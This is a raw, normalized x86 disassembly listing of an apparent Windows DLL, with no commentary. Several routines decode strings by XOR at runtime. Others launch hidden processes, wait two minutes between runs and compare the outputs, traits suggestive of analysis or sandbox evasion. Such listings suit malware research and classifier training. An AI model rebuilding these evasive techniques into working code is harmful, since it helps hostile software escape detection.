mov esi 0x8
cmp [ esp + 0xa4 ] esi
jb r-xdata
xor edi edi
xor edx edx
mov esi 0x7
mov [ esp + 0xdc ] esi
mov [ esp + 0xd8 ] edi
mov [ esp + 0xc8 ] dx
cmp [ esp + 0xa4 ] ebx
jb r-xdata
mov ecx [ esp + 0xc8 ]
push ecx
call sub_1000a86e
add esp 0x4
xor eax eax
mov edi esi
mov eax ebx
call sub_1006a100
push ebx
call sub_1000a86e
add esp 0x4
mov esi [ esp + 0x20 ]
mov eax [ esp + 0xac ]
push eax
call sub_1000a86e
add esp 0x4
xor ebx ebx
xor edx edx
mov edi 0x7
mov [ esp + 0xa4 ] edi
mov [ esp + 0xa0 ] ebx
mov [ esp + 0x90 ] dx
cmp [ esp + 0xdc ] esi
jb r-xdata
mov ecx [ esp + 0x90 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ esp + 0xa4 ] esi
mov [ esp + 0xa0 ] edi
mov [ esp + 0x90 ] cx
cmp [ esp + 0xc0 ] ebx
jb r-xdata
mov eax [ esp + 0x90 ]
push eax
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ esp + 0xdc ] edi
mov [ esp + 0xd8 ] ebx
mov [ esp + 0xc8 ] cx
cmp [ esp + 0xc0 ] esi
jb r-xdata
mov eax [ esp + 0xc8 ]
push eax
call sub_1000a86e
add esp 0x4
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] 0x0
call sub_10054bf0
mov esi [ esp + 0x1c ]
cmp esi edi
je r-xdata
mov edx [ esp + 0xac ]
push edx
call sub_1000a86e
add esp 0x4
lea eax [ esp + 0x34 ]
mov [ esp + 0x408 ] bl
call sub_10054bf0
mov esi [ esp + 0x1c ]
cmp esi ebx
je r-xdata
mov edx [ esp + 0xac ]
push edx
call sub_1000a86e
add esp 0x4
mov eax 0x4
jmp r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
mov eax 0x5
jmp r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
sub_1006bde0
push ebp
mov ebp esp
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
mov eax [ ebp + 0x8 ]
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov edx 0x9249249
sub edx eax
push edi
cmp edx esi
jae r-xdata
mov edi [ ecx + 0x8 ]
add esi eax
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_10030594
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_100566b0
mov eax esi
cmp eax esi
jae r-xdata
sub_1006be60
push ebp
mov ebp esp
push 0xffffffff
push sub_1008912d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x934
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov esi ecx
mov [ ebp - 0x92c ] esi
mov [ ebp - 0x8f8 ] edi
mov [ ebp - 0x8f4 ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8e8 ] edi
mov [ ebp - 0x8e4 ] edi
mov [ ebp - 0x8e0 ] edi
mov [ ebp - 0x8dc ] edi
mov [ ebp - 0x928 ] edi
mov [ ebp - 0x924 ] edi
mov [ ebp - 0x918 ] edi
mov [ ebp - 0x914 ] edi
mov [ ebp - 0x908 ] edi
mov [ ebp - 0x904 ] edi
mov [ ebp - 0x8d8 ] edi
mov [ ebp - 0x8d4 ] edi
mov [ ebp - 0x910 ] edi
mov [ ebp - 0x90c ] edi
mov [ ebp - 0x900 ] edi
mov [ ebp - 0x8fc ] edi
mov [ ebp - 0x8f0 ] edi
mov [ ebp - 0x8ec ] edi
mov [ ebp - 0x920 ] edi
mov [ ebp - 0x91c ] edi
mov [ ebp - 0x4 ] 0xa
cmp esi edi
jne r-xdata
lea edx [ ebp - 0x104 ]
mov eax 0x12e
call sub_10069020
push esi
lea edx [ ebp - 0x8f8 ]
lea ecx [ ebp - 0x104 ]
call sub_10020e20
test eax eax
je r-xdata
lea esi [ ebp - 0x920 ]
call sub_100299a0
lea esi [ ebp - 0x8f0 ]
call sub_100299a0
lea esi [ ebp - 0x900 ]
call sub_100299a0
lea esi [ ebp - 0x910 ]
call sub_100299a0
lea esi [ ebp - 0x8d8 ]
call sub_100299a0
lea esi [ ebp - 0x908 ]
call sub_100299a0
lea esi [ ebp - 0x918 ]
call sub_100299a0
lea esi [ ebp - 0x928 ]
call sub_100299a0
lea esi [ ebp - 0x8e0 ]
call sub_100299a0
lea esi [ ebp - 0x8e8 ]
call sub_100299a0
lea esi [ ebp - 0x8f8 ]
call sub_100299a0
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x8f8 ]
mov ecx [ eax ]
push ecx
call [ StrToIntW@IAT ]
mov [ rw-data ] eax
lea edx [ ebp - 0x1b8 ]
mov eax 0x38
call sub_10069020
push esi
lea edx [ ebp - 0x8e8 ]
lea ecx [ ebp - 0x1b8 ]
call sub_10020e20
test eax eax
je r-xdata
lea esi [ ebp - 0x920 ]
call sub_100299a0
lea esi [ ebp - 0x8f0 ]
call sub_100299a0
lea esi [ ebp - 0x900 ]
call sub_100299a0
lea esi [ ebp - 0x910 ]
call sub_100299a0
lea esi [ ebp - 0x8d8 ]
call sub_100299a0
lea esi [ ebp - 0x908 ]
call sub_100299a0
lea esi [ ebp - 0x918 ]
call sub_100299a0
lea esi [ ebp - 0x928 ]
call sub_100299a0
lea esi [ ebp - 0x8e0 ]
call sub_100299a0
lea esi [ ebp - 0x8e8 ]
call sub_100299a0
lea esi [ ebp - 0x8f8 ]
call sub_100299a0
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8e8 ]
mov esi [ edx ]
mov eax rw-data
xor ebx ebx
mov edx 0x104
sub esi eax
lea esi [ ebp - 0x920 ]
call sub_100299a0
lea esi [ ebp - 0x8f0 ]
call sub_100299a0
lea esi [ ebp - 0x900 ]
call sub_100299a0
lea esi [ ebp - 0x910 ]
call sub_100299a0
lea esi [ ebp - 0x8d8 ]
call sub_100299a0
lea esi [ ebp - 0x908 ]
call sub_100299a0
lea esi [ ebp - 0x918 ]
call sub_100299a0
lea esi [ ebp - 0x928 ]
call sub_100299a0
lea esi [ ebp - 0x8e0 ]
call sub_100299a0
lea esi [ ebp - 0x8e8 ]
call sub_100299a0
lea esi [ ebp - 0x8f8 ]
call sub_100299a0
mov eax 0x3
jmp r-xdata
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
xor edx edx
mov [ eax ] dx
cmp ebx edi
jge r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0x144 ]
mov eax 0x11d
call sub_10069020
mov eax [ ebp - 0x92c ]
push eax
lea edx [ ebp - 0x8e0 ]
lea ecx [ ebp - 0x144 ]
call sub_10020e20
test eax eax
je r-xdata
lea esi [ ebp - 0x920 ]
call sub_100299a0
lea esi [ ebp - 0x8f0 ]
call sub_100299a0
lea esi [ ebp - 0x900 ]
call sub_100299a0
lea esi [ ebp - 0x910 ]
call sub_100299a0
lea esi [ ebp - 0x8d8 ]
call sub_100299a0
lea esi [ ebp - 0x908 ]
call sub_100299a0
lea esi [ ebp - 0x918 ]
call sub_100299a0
lea esi [ ebp - 0x928 ]
call sub_100299a0
lea esi [ ebp - 0x8e0 ]
call sub_100299a0
lea esi [ ebp - 0x8e8 ]
call sub_100299a0
lea esi [ ebp - 0x8f8 ]
call sub_100299a0
mov eax 0x4
jmp r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8e0 ]
mov esi [ ecx ]
mov eax rw-data
xor ebx ebx
mov edx 0x104
sub esi eax
lea esi [ ebp - 0x920 ]
call sub_100299a0
lea esi [ ebp - 0x8f0 ]
call sub_100299a0
lea esi [ ebp - 0x900 ]
call sub_100299a0
lea esi [ ebp - 0x910 ]
call sub_100299a0
lea esi [ ebp - 0x8d8 ]
call sub_100299a0
lea esi [ ebp - 0x908 ]
call sub_100299a0
lea esi [ ebp - 0x918 ]
call sub_100299a0
lea esi [ ebp - 0x928 ]
call sub_100299a0
lea esi [ ebp - 0x8e0 ]
call sub_100299a0
lea esi [ ebp - 0x8e8 ]
call sub_100299a0
lea esi [ ebp - 0x8f8 ]
call sub_100299a0
mov eax 0x5
jmp r-xdata
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
xor edx edx
mov [ eax ] dx
cmp ebx edi
jge r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0x18c ]
mov eax 0x10f
call sub_10069020
mov eax [ ebp - 0x92c ]
push eax
lea edx [ ebp - 0x928 ]
lea ecx [ ebp - 0x18c ]
call sub_10020e20
test eax eax
je r-xdata
lea esi [ ebp - 0x920 ]
call sub_100299a0
lea esi [ ebp - 0x8f0 ]
call sub_100299a0
lea esi [ ebp - 0x900 ]
call sub_100299a0
lea esi [ ebp - 0x910 ]
call sub_100299a0
lea esi [ ebp - 0x8d8 ]
call sub_100299a0
lea esi [ ebp - 0x908 ]
call sub_100299a0
lea esi [ ebp - 0x918 ]
call sub_100299a0
lea esi [ ebp - 0x928 ]
call sub_100299a0
lea esi [ ebp - 0x8e0 ]
call sub_100299a0
lea esi [ ebp - 0x8e8 ]
call sub_100299a0
lea esi [ ebp - 0x8f8 ]
call sub_100299a0
mov eax 0x6
jmp r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x928 ]
mov esi [ ecx ]
mov eax rw-data
xor ebx ebx
mov edx 0x104
sub esi eax
lea esi [ ebp - 0x920 ]
call sub_100299a0
lea esi [ ebp - 0x8f0 ]
call sub_100299a0
lea esi [ ebp - 0x900 ]
call sub_100299a0
lea esi [ ebp - 0x910 ]
call sub_100299a0
lea esi [ ebp - 0x8d8 ]
call sub_100299a0
lea esi [ ebp - 0x908 ]
call sub_100299a0
lea esi [ ebp - 0x918 ]
call sub_100299a0
lea esi [ ebp - 0x928 ]
call sub_100299a0
lea esi [ ebp - 0x8e0 ]
call sub_100299a0
lea esi [ ebp - 0x8e8 ]
call sub_100299a0
lea esi [ ebp - 0x8f8 ]
call sub_100299a0
mov eax 0x7
jmp r-xdata
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
xor edx edx
mov [ eax ] dx
cmp ebx edi
jge r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0x124 ]
mov eax 0x15
call sub_10069020
mov ebx [ ebp - 0x92c ]
push ebx
lea edx [ ebp - 0x918 ]
lea ecx [ ebp - 0x124 ]
call sub_10020e20
test eax eax
jne r-xdata
lea esi [ ebp - 0x920 ]
call sub_100299a0
lea esi [ ebp - 0x8f0 ]
call sub_100299a0
lea esi [ ebp - 0x900 ]
call sub_100299a0
lea esi [ ebp - 0x910 ]
call sub_100299a0
lea esi [ ebp - 0x8d8 ]
call sub_100299a0
lea esi [ ebp - 0x908 ]
call sub_100299a0
lea esi [ ebp - 0x918 ]
call sub_100299a0
lea esi [ ebp - 0x928 ]
call sub_100299a0
lea esi [ ebp - 0x8e0 ]
call sub_100299a0
lea esi [ ebp - 0x8e8 ]
call sub_100299a0
lea esi [ ebp - 0x8f8 ]
call sub_100299a0
mov eax 0x8
jmp r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x8b
call sub_10069020
push ebx
lea edx [ ebp - 0x908 ]
lea ecx [ ebp - 0x3c ]
call sub_10020e20
test eax eax
jne r-xdata
mov eax [ ebp - 0x918 ]
mov ecx [ eax ]
push ecx
call sub_100301c0
add esp 0x4
mov [ rw-data ] eax
mov [ rw-data ] edx
lea edx [ ebp - 0xe8 ]
mov eax 0xca
call sub_10069020
push ebx
lea edx [ ebp - 0x8d8 ]
lea ecx [ ebp - 0xe8 ]
call sub_10020e20
test eax eax
jne r-xdata
mov edx [ ebp - 0x908 ]
mov esi [ edx ]
mov eax rw-data
mov edx 0x104
sub esi eax
lea esp [ esp ]
lea edx [ ebp - 0xb0 ]
mov eax 0xe
call sub_10069020
push ebx
lea edx [ ebp - 0x910 ]
lea ecx [ ebp - 0xb0 ]
call sub_10020e20
test eax eax
jne r-xdata
mov eax [ ebp - 0x8d8 ]
mov ecx [ eax ]
push ecx
call sub_10002bd3
add esp 0x4
mov [ rw-data ] eax
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0x2a
call sub_10069020
push ebx
lea edx [ ebp - 0x900 ]
lea ecx [ ebp - 0x7c ]
call sub_10020e20
test eax eax
jne r-xdata
mov edx [ ebp - 0x910 ]
mov eax [ edx ]
push eax
call sub_10002bd3
add esp 0x4
mov [ rw-data ] eax
xor edx edx
mov [ eax ] dx
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0x147
call sub_10069020
push ebx
lea edx [ ebp - 0x8f0 ]
lea ecx [ ebp - 0xcc ]
call sub_10020e20
test eax eax
jne r-xdata
mov ecx [ ebp - 0x900 ]
mov edx [ ecx ]
push edx
call sub_1005ac37
fstp [ rw-data ]
add esp 0x4
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov [ ebp - 0x93c ] edi
mov [ ebp - 0x938 ] edi
lea edx [ ebp - 0x64 ]
mov eax 0x13d
mov [ ebp - 0x4 ] 0xb
call sub_10069020
push ebx
lea edx [ ebp - 0x93c ]
lea ecx [ ebp - 0x64 ]
call sub_10020e20
test eax eax
jne r-xdata
mov eax [ ebp - 0x8f0 ]
mov ecx [ eax ]
push ecx
call sub_1005ac37
fstp [ rw-data ]
add esp 0x4
lea edx [ ebp - 0x8d0 ]
mov eax 0x114
call sub_10069020
lea edx [ ebp - 0x94 ]
mov eax 0xe0
call sub_10069020
lea edx [ ebp - 0x168 ]
mov eax 0x61
call sub_10069020
lea edx [ ebp - 0x28 ]
mov eax 0xa
call sub_10069020
lea edx [ ebp - 0x1c ]
mov eax 0x1c
call sub_10069020
lea edx [ ebp - 0x50 ]
mov eax 0xbf
call sub_10069020
lea edx [ ebp - 0x934 ]
mov eax 0x7b
call sub_10069020
mov ebx 0x7
xor eax eax
mov [ ebp - 0x7d8 ] ebx
mov [ ebp - 0x7dc ] edi
mov [ ebp - 0x7ec ] ax
mov ecx [ ebp - 0x92c ]
push ecx
lea edx [ ebp - 0x920 ]
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0xc
call sub_10020e20
test eax eax
jne r-xdata
mov edx [ ebp - 0x93c ]
mov edx [ edx ]
push rw-data
call sub_10019010
jmp r-xdata
push 0x11b8
call sub_1002e3ac
add esp 0x4
cmp eax edi
je r-xdata
mov eax [ ebp - 0x920 ]
lea edx [ ebp - 0x7ec ]
push edx
mov edx [ eax ]
call sub_10019010
lea esi [ ebp - 0x93c ]
call sub_100299a0
lea esi [ ebp - 0x920 ]
call sub_100299a0
lea esi [ ebp - 0x8f0 ]
call sub_100299a0
lea esi [ ebp - 0x900 ]
call sub_100299a0
lea esi [ ebp - 0x910 ]
call sub_100299a0
lea esi [ ebp - 0x8d8 ]
call sub_100299a0
lea esi [ ebp - 0x908 ]
call sub_100299a0
lea esi [ ebp - 0x918 ]
call sub_100299a0
lea esi [ ebp - 0x928 ]
call sub_100299a0
lea esi [ ebp - 0x8e0 ]
call sub_100299a0
lea esi [ ebp - 0x8e8 ]
call sub_100299a0
lea esi [ ebp - 0x8f8 ]
call sub_100299a0
xor eax eax
mov [ ebp - 0x930 ] edi
mov esi edi
mov ecx rw-data
mov esi eax
call sub_1005efd0
mov esi eax
mov [ ebp - 0x930 ] esi
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x7f4 ] ebx
mov [ ebp - 0x7f8 ] edi
mov [ ebp - 0x808 ] cx
lea edx [ ebp - 0x8d0 ]
push edx
mov eax edx
push eax
mov ecx edx
push ecx
push edi
push 0x1
mov bl 0xd
push esi
lea eax [ ebp - 0x7d0 ]
mov [ ebp - 0x4 ] bl
call sub_1005bf30
test eax eax
jne r-xdata
lea eax [ ebp - 0x8d0 ]
push eax
mov ecx eax
push ecx
mov edx eax
push edx
push edi
push 0x1
push esi
lea eax [ ebp - 0x5c8 ]
call sub_1005bf30
test eax eax
lea eax [ ebp - 0x7ec ]
push eax
jne r-xdata
push 0x104
lea ecx [ ebp - 0x3c0 ]
push ecx
push edi
call [ GetModuleFileNameW@IAT ]
lea edx [ ebp - 0x3c0 ]
push edx
call [ PathRemoveFileSpecW@IAT ]
cmp [ ebp - 0x7dc ] edi
jne r-xdata
lea eax [ ebp - 0x808 ]
push eax
lea edx [ ebp - 0x50 ]
call sub_10019010
lea edx [ ebp - 0x7d0 ]
push edx
lea ecx [ ebp - 0x824 ]
call sub_1004a920
push eax
lea edx [ ebp - 0x1c ]
lea esi [ ebp - 0x840 ]
mov [ ebp - 0x4 ] 0xe
call sub_100519f0
add esp 0x4
push eax
lea ecx [ ebp - 0x808 ]
mov [ ebp - 0x4 ] 0xf
call sub_10033f90
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x824 ]
mov [ ebp - 0x4 ] bl
call sub_100702e0
jmp r-xdata
lea edx [ ebp - 0x28 ]
call sub_10019010
lea edx [ ebp - 0x5c8 ]
call sub_10019010
mov eax [ ebp - 0x92c ]
lea ecx [ ebp - 0x5c8 ]
push ecx
lea edx [ ebp - 0x168 ]
push edx
call sub_1004b280
jmp r-xdata
mov edx edi
mov edx [ edi ]
jmp r-xdata
lea ecx [ ebp - 0x3c0 ]
push ecx
lea ecx [ ebp - 0x8cc ]
call sub_1004a920
push eax
lea edx [ ebp - 0x934 ]
lea esi [ ebp - 0x894 ]
mov [ ebp - 0x4 ] 0x10
call sub_100519f0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x808 ]
lea esi [ ebp - 0x878 ]
mov [ ebp - 0x4 ] 0x11
call sub_1006acf0
mov edi eax
lea edx [ ebp - 0x3c0 ]
push edx
lea ecx [ ebp - 0x8b0 ]
mov [ ebp - 0x4 ] 0x12
call sub_1004a920
push eax
lea edx [ ebp - 0x934 ]
lea esi [ ebp - 0x85c ]
mov [ ebp - 0x4 ] 0x13
call sub_100519f0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x7ec ]
lea esi [ ebp - 0x840 ]
mov [ ebp - 0x4 ] 0x14
call sub_1006acf0
mov ecx 0x8
mov [ ebp - 0x4 ] 0x15
cmp [ edi + 0x14 ] ecx
jb r-xdata
lea ecx [ ebp - 0x824 ]
push ecx
mov ecx eax
call sub_1005d190
add esp 0x4
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x16
call sub_10033f90
lea ecx [ ebp - 0x824 ]
call sub_100702e0
lea ecx [ ebp - 0x840 ]
call sub_100702e0
lea ecx [ ebp - 0x85c ]
call sub_100702e0
lea ecx [ ebp - 0x8b0 ]
call sub_100702e0
lea ecx [ ebp - 0x878 ]
call sub_100702e0
lea ecx [ ebp - 0x894 ]
call sub_100702e0
lea ecx [ ebp - 0x8cc ]
call sub_100702e0
mov edx [ ebp - 0x930 ]
push edx
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0x808 ]
call sub_100702e0
lea ecx [ ebp - 0x7ec ]
call sub_100702e0
mov eax [ eax ]
cmp [ eax + 0x14 ] ecx
jb r-xdata
sub_1006caa0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10018590
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_1006cad0
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
mov edi eax
cmp esi [ ebp + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
xor ebx ebx
add esi 0x1c
add edi 0x1c
cmp esi [ ebp + 0x8 ]
jne r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp edi esi
je r-xdata
mov eax edi
pop ebx
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] cx
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov eax [ edi ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ esi ]
mov [ edi ] ecx
mov [ esi ] ebx
mov edx [ esi + 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
push esi
push edi
call sub_1007ec40
add esp 0xc
jmp r-xdata
mov edx [ esi + 0x10 ]
mov [ edi + 0x10 ] edx
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
sub_1006cb60
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1002d290
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb0
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ rw-data ]
mov [ ebp - 0xbc ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x3c ]
mov eax 0x21
call sub_10019570
lea edx [ ebp - 0x2c ]
mov eax 0xd
call sub_10019570
lea edx [ ebp - 0xb8 ]
mov eax 0x16
call sub_10019570
lea edi [ esi + 0xda0 ]
push edi
mov ecx esi
call sub_1001d310
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov edx edi
lea ecx [ ebp - 0x2c ]
call sub_100130f0
cmp [ edi ] ax
jne r-xdata
lea ecx [ ebp - 0x3c ]
push ecx
mov edx edi
lea ecx [ ebp - 0x2c ]
call sub_100130f0
cmp [ edi ] ax
jne r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x2
call sub_10019570
lea edi [ esi + 0xfa8 ]
push edi
mov ecx esi
call sub_1001d310
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov [ esi + 0x11b0 ] 0x1
jmp r-xdata
sub_1006cc80
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_10072070
mov edx [ esi ]
push edx
call sub_1000a86e
add esp 0x14
sub_1006ccd0
push ebp
mov ebp esp
sub esp 0x30c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ rw-data ]
push edi
xor ebx ebx
push 0x208
lea eax [ ebp - 0x280 ]
push ebx
push eax
mov [ ebp - 0x2b4 ] ebx
call sub_1007f8f0
mov ecx [ r--data ]
add esp 0xc
mov [ ebp - 0x284 ] ebx
xor eax eax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffd5
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0x9
jb r-xdata
lea ecx [ ebp - 0x48 ]
push ecx
xor eax eax
add esi 0xda0
push esi
mov [ ebp - 0x36 ] ax
call [ StrStrIW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor al al
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
push ebx
lea edx [ ebp - 0x2c0 ]
push edx
lea eax [ ebp - 0x2a4 ]
push eax
lea ecx [ ebp - 0x288 ]
push ecx
mov [ ebp - 0x2c0 ] 0xc
mov [ ebp - 0x2b8 ] 0x1
mov [ ebp - 0x2bc ] ebx
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x288 ]
push ebx
push 0x1
push edx
call [ SetHandleInformation@IAT ]
test eax eax
je r-xdata
push 0x44
lea eax [ ebp - 0x308 ]
push ebx
push eax
call sub_1007f8f0
or [ ebp - 0x2dc ] 0x100
xor eax eax
mov [ ebp - 0x2a0 ] eax
mov [ ebp - 0x29c ] eax
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x294 ] eax
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x2c8 ] eax
mov [ ebp - 0x2cc ] eax
add esp 0xc
lea edx [ ebp - 0x74 ]
mov eax 0x23
mov [ ebp - 0x308 ] 0x44
call sub_10019570
push 0x104
lea ecx [ ebp - 0x280 ]
push ecx
push edx
call [ ExpandEnvironmentStringsW@IAT ]
lea edx [ ebp - 0x60 ]
mov eax 0x8
call sub_10019570
mov esi [ CreateProcessW@IAT ]
lea eax [ ebp - 0x2a0 ]
push eax
lea ecx [ ebp - 0x308 ]
push ecx
push ebx
push ebx
push 0x8000000
push 0x1
push ebx
push ebx
push edx
lea eax [ ebp - 0x280 ]
push eax
call esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x2a0 ]
mov edi [ WaitForSingleObject@IAT ]
push 0xffffffff
push ecx
call edi
mov ecx [ ebp - 0x288 ]
push ebx
mov ebx [ ReadFile@IAT ]
lea edx [ ebp - 0x284 ]
push edx
push 0x14
lea eax [ ebp - 0x34 ]
push eax
push ecx
call ebx
mov edx [ ebp - 0x284 ]
push 0x1d4c0
mov [ ebp + edx - 0x34 ] 0x0
call [ Sleep@IAT ]
push 0x44
lea eax [ ebp - 0x308 ]
push 0x0
push eax
call sub_1007f8f0
or [ ebp - 0x2dc ] 0x100
add esp 0xc
lea ecx [ ebp - 0x2a0 ]
push ecx
lea edx [ ebp - 0x308 ]
push edx
push 0x0
push 0x0
xor eax eax
push 0x8000000
push 0x1
mov [ ebp - 0x2a0 ] eax
mov [ ebp - 0x29c ] eax
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x294 ] eax
mov eax [ ebp - 0x2a4 ]
push 0x0
mov [ ebp - 0x2c8 ] eax
mov [ ebp - 0x2cc ] eax
push 0x0
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x280 ]
push ecx
mov [ ebp - 0x308 ] 0x44
call esi
test eax eax
je r-xdata
mov edx [ ebp - 0x2a0 ]
push 0xffffffff
push edx
call edi
mov edx [ ebp - 0x288 ]
xor edi edi
push edi
lea eax [ ebp - 0x284 ]
push eax
push 0x14
lea ecx [ ebp - 0x20 ]
push ecx
push edx
mov [ ebp - 0x284 ] edi
call ebx
mov eax [ ebp - 0x284 ]
mov [ ebp + eax - 0x20 ] 0x0
xor esi esi
mov ebx esi
inc esi
cmp esi 0x14
jb r-xdata
mov esi edi
inc edi
cmp edi 0x14
jb r-xdata
movsx ecx [ ebp + esi - 0x34 ]
push ecx
call sub_10001b6d
add esp 0x4
test eax eax
jne r-xdata
mov ebx edi
jmp r-xdata
mov dl [ eax + edi ]
xor dl cl
xor dl 0x5e
inc cl
mov [ ebp + eax - 0xc ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x290 ]
push eax
lea ecx [ ebp - 0x2a8 ]
push ecx
lea edx [ ebp - 0xc ]
push edx
lea eax [ ebp + ebx - 0x34 ]
push eax
mov [ ebp - 0x7 ] 0x0
call sub_10048324
lea ecx [ ebp - 0x28c ]
push ecx
lea edx [ ebp - 0x2b0 ]
push edx
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp + esi - 0x20 ]
push ecx
call sub_10048324
mov edx [ ebp - 0x2b0 ]
add esp 0x20
sub edx [ ebp - 0x2a8 ]
je r-xdata
movsx edx [ ebp + edi - 0x20 ]
push edx
call sub_10001b6d
add esp 0x4
test eax eax
jne r-xdata
mov esi [ ebp - 0x2b4 ]
jmp r-xdata
mov ecx [ ebp - 0x28c ]
sub ecx [ ebp - 0x290 ]
cmp ecx 0x2
jge r-xdata
mov eax [ ebp - 0x28c ]
sub eax [ ebp - 0x290 ]
add eax 0x3c
cmp eax 0x2
jge r-xdata
mov edi [ r--data ]
xor cl cl
xor eax eax
lea esp [ esp ]
mov al 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
